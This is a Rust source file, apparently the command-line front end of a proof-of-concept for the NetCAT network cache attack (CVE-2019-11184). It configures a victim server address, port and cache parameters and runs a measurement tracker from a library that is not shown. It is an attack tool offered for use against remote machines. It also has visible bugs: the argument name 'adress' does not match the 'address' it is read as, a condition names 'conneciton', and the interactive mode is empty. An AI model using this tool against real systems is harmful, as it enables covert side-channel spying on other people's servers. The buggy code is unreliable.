use clap::{crate_authors, crate_version, App, Arg};
use std::net::IpAddr;
use std::str::FromStr;

const DEFAULT_PORT: &str = "9003";
const DEFAULT_MEASUREMENT_CNT: &str = "10000";
const DEFAULT_CACHE: &str = "E5_DDIO";

static CONN_TYPES: &[&str] = &["rdma", "local"];
static CACHES: &[&str] = &["E5", "E5_DDIO", "I7", "custom"];

fn main() {
    let matches = app_cli_config().get_matches();

    if matches.is_present("interactive") {
        interactive::run_session();
    } else {
        uninteractive::run_session(matches);
    }
}

fn app_cli_config<'a, 'b>() -> App<'a, 'b> {
    App::new("NetCAT PoC")
        .version(crate_version!())
        .author(crate_authors!())
        .about("Implementation of the Network Cache Attack (CVE-2019-11184)")
        .arg(
            Arg::with_name("connection")
                .long("conn")
                .short("c")
                .value_name("CONNECTION_TYPE")
                .possible_values(CONN_TYPES)
                .default_value("rdma")
                .help("Sets the connection type"),
        )
        .arg(
            Arg::with_name("adress")
                .help("Victim server adress")
                .long("addr")
                .short("a")
                .takes_value(true)
                .required_if("connection", "rdma")
                .value_name("IP_ADDR")
                .validator(|x| match IpAddr::from_str(x.as_str()) {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty IP adress")),
                }),
        )
        .arg(
            Arg::with_name("port")
                .help("Victim server port to be used for control packets")
                .long("port")
                .short("p")
                .takes_value(true)
                .required_if("conneciton", "rdma")
                .value_name("PORT")
                .default_value(DEFAULT_PORT)
                .validator(|x| match x.parse::<u16>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty port")),
                }),
        )
        .arg(
            Arg::with_name("measurements")
                .help("The number of measurements to be taken")
                .long("measurements")
                .short("m")
                .takes_value(true)
                .default_value(DEFAULT_MEASUREMENT_CNT)
                .value_name("MESUREMENTS")
                .validator(|num_str| match num_str.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("MEAUSEMENTS should be a number")),
                }),
        )
        .arg(
            Arg::with_name("cache_description")
                .help("Parameters, describing last level cache of the victim's machine")
                .long("cache_params")
                .short("d")
                .value_name("CACHE")
                .default_value(DEFAULT_CACHE)
                .possible_values(CACHES)
        )
        .arg(
            Arg::with_name("custom_cache")
                .help("Gives concrete parameters of the victim's LLC, if the predifined are not enough")
                .long("custom_params")
                .value_names(&["BYTES_PER_LINE", "ASSOCIATIVITY", "CACHE_SIZE"])
                .required_if("cache_description", "custom")
                .validator(|s| match s.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err("Invalind cache parameters: should be numbers".to_string())
                })
        )
        .arg_from_usage("[quite] -q --quite 'Does not disturb anyone by the output'")
        .arg_from_usage("[interactive] -i --interactive 'Sets the program into interactive mode'")
        .arg_from_usage("[output] 'Output file to dump data to'")
}

mod uninteractive {
    use clap::{value_t, ArgMatches};
    use console::style;
    use get_if_addrs::get_if_addrs;
    use netcat::connection::CacheConnector;
    use netcat::connection::{local::LocalMemoryConnector, rdma::RdmaServerConnector};
    use netcat::online_tracker;
    use netcat::rpp::params::CacheParams;
    use netcat::rpp::params::*;
    use netcat::rpp::Contents;
    use std::net::ToSocketAddrs;

    pub fn run_session(args: ArgMatches) {
        let quite = args.is_present("quite");
        let port = value_t!(args.value_of("port"), u16).unwrap();
        let cnt = value_t!(args.value_of("measurements"), usize).unwrap();

        let cache_type = args.value_of("cache_description").unwrap();

        let cparams = match cache_type {
            "E5" => XEON_E5,
            "E5_DDIO" => XEON_E5_DDIO,
            "I7" => CORE_I7,
            "custom" => {
                let mut vals = args.values_of("custom_cache").unwrap();
                let bytes_per_line = vals.next().unwrap().parse().unwrap();
                let lines_per_set = vals.next().unwrap().parse().unwrap();
                let cache_size = vals.next().unwrap().parse().unwrap();
                CacheParams::new(bytes_per_line, lines_per_set, cache_size)
            }
            _ => panic!("Unsupported value"),
        };

        // Unwraping is ok as we have a default value
        if args.value_of("connection").unwrap() == "rdma" {
            // these are required for rdma and validated
            let ip = args.value_of("address").unwrap();
            let conn = RdmaServerConnector::new((ip, port));

            do_measurements((ip, port), conn, cnt, quite, cparams);
        } else {
            // this is a local scenario
            // but we still need an address for synchronization
            let ip = get_if_addrs()
                .expect("ERROR: Could not get machine network interfaces")
                .into_iter()
                .filter(|i| !i.is_loopback())
                .next()
                .expect("ERROR: no network interface found")
                .ip();
            let conn = LocalMemoryConnector::new();

            do_measurements((ip, port), conn, cnt, quite, cparams);
        }
    }

    pub fn do_measurements<A, C>(addr: A, conn: C, cnt: usize, quite: bool, cparams: CacheParams)
    where
        A: ToSocketAddrs,
        C: CacheConnector<Item = Contents>,
    {
        let mut tracker =
            online_tracker::OnlineTracker::for_cache(addr, conn, quite, cparams).unwrap();

        if let Err(e) = tracker.track(cnt) {
            if !quite {
                println!("Online Tracker: {}", style(e).red());
            }
        }
        if !quite {
            println!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );
        }
    }
}

mod interactive {
    use dialoguer::{Select, theme::ColorfulTheme};
    pub fn run_session() {
        let conn_selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Pick your flavor")
            .default(0)
            .items(super::CONN_TYPES)
            .interact()
            .unwrap();
        if super::CONN_TYPES[conn_selection] == "rdma" {
            
        }
        
    }
}
